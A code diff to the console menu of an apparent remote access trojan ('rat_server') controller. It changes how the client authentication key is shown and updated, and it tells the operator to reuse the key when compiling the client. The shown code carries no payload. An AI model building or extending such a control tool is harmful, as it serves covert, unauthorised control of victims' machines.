@@ -158,6 +158,15 @@ def show_main_menu(server_running, host, port, client_sockets, max_clients, acti
         client_count = sum(1 for client in client_sockets if client is not None)
         print(f"{Fore.GREEN}● Server Running On {Fore.CYAN}{host}{Fore.WHITE}:{Fore.YELLOW}{port}{Style.RESET_ALL}")
         print(f"{Fore.GREEN}● Connected Clients: {Fore.CYAN}{client_count}{Fore.WHITE}/{Fore.YELLOW}{max_clients} {Fore.LIGHTBLUE_EX}({(client_count/max_clients)*100:.1f}% capacity){Style.RESET_ALL}")
+        
+        # Display authentication key status
+        from rat_server import get_auth_key
+        auth_key = get_auth_key()
+        if auth_key:
+            print(f"{Fore.GREEN}● Authentication Key: {Fore.CYAN}{auth_key}{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.RED}● Authentication Key: {Fore.RED}NOT SET{Style.RESET_ALL}")
+        
         if active_client >= 0:
             print(f"{Fore.GREEN}● Active Client: {active_client}{Style.RESET_ALL}")
     else:
@@ -176,9 +185,9 @@ def show_options_panel(port, host, buffer_size, max_clients, client_sockets, han
         print_banner()
         
         print(f"{Fore.CYAN}=== OPTIONS ==={Style.RESET_ALL}\n")
-        # Import AUTH_KEY directly from rat_server
-        import rat_server
-        AUTH_KEY = rat_server.AUTH_KEY
+        # Get current authentication key
+        from rat_server import get_auth_key
+        AUTH_KEY = get_auth_key()
         
         print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Port: {Fore.CYAN}{port}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}2.{Style.RESET_ALL} Host: {Fore.CYAN}{host}{Style.RESET_ALL}")
@@ -296,9 +305,9 @@ def show_options_panel(port, host, buffer_size, max_clients, client_sockets, han
             new_key = input(f"{Fore.CYAN}Key: {Style.RESET_ALL}").strip()
             
             if new_key:
-                # Update the global AUTH_KEY directly
-                import rat_server
-                rat_server.AUTH_KEY = new_key
+                # Update the authentication key using the setter function
+                from rat_server import set_auth_key
+                set_auth_key(new_key)
                 print(f"{Fore.GREEN}Authentication key updated successfully!{Style.RESET_ALL}")
                 print(f"{Fore.YELLOW}Note: Make sure to use the same key '{new_key}' when compiling the client{Style.RESET_ALL}")
             else:
